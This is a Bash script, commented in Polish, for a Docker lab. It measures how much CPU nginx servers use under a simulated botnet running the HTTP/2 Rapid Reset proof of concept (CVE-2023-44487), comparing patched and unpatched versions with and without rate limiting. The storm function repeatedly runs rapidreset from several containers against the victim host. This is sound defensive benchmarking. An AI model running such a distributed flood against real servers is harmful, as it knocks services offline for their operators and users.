#!/usr/bin/env bash
# =============================================================================
# Botnet vs nginx — matryca obciążenia (CVE-2023-44487 HTTP/2 Rapid Reset)
# =============================================================================
# Mierzy obciążenie CPU serwera-ofiary w funkcji ROZMIARU BOTNETU (1..5)
# dla 4 konfiguracji serwera:
#     old/normal   — nienałatany nginx 1.25.1, bez hardeningu
#     old/hardened — nienałatany nginx 1.25.1 + rate-limiting per-IP
#     new/normal   — załatany nginx 1.27,   bez hardeningu
#     new/hardened — załatany nginx 1.27   + rate-limiting per-IP
#
# Każdy bot = osobny kontener = OSOBNE IP (prawdziwy ruch rozproszony).
# Atak = PoC rapidreset (HEADERS + natychmiastowy RST_STREAM w pętli).
# CPU ofiary = delta cgroup usage_usec / czas okna, uśrednione z 3 okien.
#
# WYMAGANIA (uruchom najpierw w katalogu repo):
#     docker compose up -d --build          # podnosi sieć labnet + loadgen + bot(obraz)
# Sieć i obrazy mają stałe nazwy (compose: name=ddos-lab), więc działa na każdej maszynie.
#
# PARAMETRY (zmienne środowiskowe — na mocniejszym CPU podnieś BOT_CPUS/CONC):
#     BOT_CPUS=0.8   limit CPU na bota (na 4-rdzeniowym hoście ~0.4; na mocnym 1.0+)
#     VIC_CPUS=1.0   limit CPU ofiary (ile rdzeni może zająć serwer)
#     CONC=400       liczba równoczesnych strumieni na jedno uderzenie bota
#     SIZES="1 2 3 4 5"   rozmiary botnetu do przejścia
#     OUTDIR=...      gdzie zapisać wyniki (domyślnie lab-results/data)
#
# Przykład na mocnej maszynie:  BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 ./run-botnet-matrix.sh
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true   # Git Bash na Windows: nie psuj ścieżek

HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"               # katalog repo
OUTDIR="${OUTDIR:-$HERE/../data}"; mkdir -p "$OUTDIR"
CSV="$OUTDIR/botnet.csv"; TL="$OUTDIR/botnet_timeline.txt"

NETWORK="${NETWORK:-ddos-lab_labnet}"
BOT_IMAGE="${BOT_IMAGE:-ddos-lab-bot}"          # obraz bota zbudowany przez compose
LOADGEN="${LOADGEN:-lab-loadgen}"               # kontener z curl (do stub_status)
BOT_CPUS="${BOT_CPUS:-0.8}"; VIC_CPUS="${VIC_CPUS:-1.0}"
CONC="${CONC:-400}"; REQ="${REQ:-2000}"
SIZES="${SIZES:-1 2 3 4 5}"
WARM=3; WIN=5; NWIN=3; GAP=4
DUR=$((WARM + WIN*NWIN + 2))
NMAX=0; for s in $SIZES; do [ "$s" -gt "$NMAX" ] && NMAX=$s; done

log(){ echo "$(date '+%H:%M:%S') | $*" | tee -a "$TL"; }
cpu_usec(){ timeout 6 docker exec lab-victim2 sh -c 'awk "/usage_usec/{print \$2}" /sys/fs/cgroup/cpu.stat' 2>/dev/null; }
active(){ timeout 6 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 4 https://victim/status 2>/dev/null' | awk '/Active/{print $3}'; }
storm(){ local n=$1 dur=$2 b; for b in $(seq 1 $n); do docker exec -d lab-bot$b sh -c 'end=$(( $(date +%s)+'"$dur"' )); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests '"$REQ"' -concurrency '"$CONC"' >/dev/null 2>&1; done' 2>/dev/null; done; }
stopb(){ local n=$1 b; for b in $(seq 1 $n); do docker exec lab-bot$b pkill rapidreset 2>/dev/null; done; }

# --- 0. sanity: sieć istnieje? ---
docker network inspect "$NETWORK" >/dev/null 2>&1 || { echo "BŁĄD: brak sieci $NETWORK — uruchom najpierw: docker compose up -d --build"; exit 1; }

# --- 1. obrazy ofiary (stary/nowy nginx, obie konfiguracje w środku) ---
log "build labvic:old (nginx 1.25.1) + labvic:new (nginx 1.27)"
docker build -q -f "$ROOT/victim/Dockerfile.labvic" --build-arg BASE=nginx:1.25.1-alpine -t labvic:old "$ROOT/victim" >/dev/null
docker build -q -f "$ROOT/victim/Dockerfile.labvic" --build-arg BASE=nginx:1.27-alpine    -t labvic:new "$ROOT/victim" >/dev/null

# --- 2. flota botów (osobne IP, limit CPU) ---
log "flota $NMAX botów (cap ${BOT_CPUS} CPU/bot) na sieci $NETWORK"
for i in $(seq 1 $NMAX); do
  docker rm -f lab-bot$i >/dev/null 2>&1
  docker run -d --name lab-bot$i --cpus="$BOT_CPUS" --network "$NETWORK" "$BOT_IMAGE" >/dev/null
done

echo "config,ver,hard,size,cpu_pct,active" > "$CSV"

run_config(){ # ver mode
  local VER=$1 MODE=$2 IMG="labvic:$1" N w u0 u1 t0 t1 cw sum k acc cpu i
  docker rm -f lab-victim2 >/dev/null 2>&1
  docker run -d --name lab-victim2 --network "$NETWORK" --network-alias victim --cpus="$VIC_CPUS" -e MODE=$MODE "$IMG" >/dev/null
  log "=== CONFIG $VER/$MODE ==="
  i=0; while [ $i -lt 20 ]; do timeout 4 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 3 https://victim/status >/dev/null 2>&1' && break; i=$((i+1)); sleep 1; done
  storm 2 6; sleep 6; stopb 2; sleep 3           # pre-warm (odrzucone)
  for N in $SIZES; do
    storm $N $DUR; sleep $WARM
    sum=0; k=0; acc=0
    for w in $(seq 1 $NWIN); do
      u0=$(cpu_usec); t0=$(date +%s%N); sleep $WIN; u1=$(cpu_usec); t1=$(date +%s%N)
      [ $w -eq 2 ] && acc=$(active)
      if [ -n "$u0" ] && [ -n "$u1" ]; then cw=$(awk "BEGIN{printf \"%.2f\",($u1-$u0)/(($t1-$t0)/1000)*100}"); sum=$(awk "BEGIN{print $sum+$cw}"); k=$((k+1)); fi
    done
    stopb $N
    cpu=$(awk "BEGIN{if($k>0)printf \"%.1f\",$sum/$k; else print \"NA\"}")
    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0}" >> "$CSV"
    log "size=$N -> CPU=${cpu}% active=${acc:-0}"
    sleep $GAP
  done
}

run_config old normal
run_config old hardened
run_config new normal
run_config new hardened

log "MATRYCA GOTOWA -> $CSV"
echo; echo "=== WYNIK (CPU% ofiary wg rozmiaru botnetu) ==="
awk -F, 'NR>1{d[$1","$4]=$5; seen[$1]=1} END{printf "%-14s  s1     s2     s3     s4     s5\n","config"; for(k in seen){printf "%-14s",k; for(n=1;n<=5;n++)printf " %6s",d[k","n]; print ""}}' "$CSV" | sort

# sprzątanie floty/ofiary (zostaw bazowy lab)
for i in $(seq 1 $NMAX); do docker rm -f lab-bot$i >/dev/null 2>&1; done
docker rm -f lab-victim2 >/dev/null 2>&1
log "sprzątnięto flotę i lab-victim2"
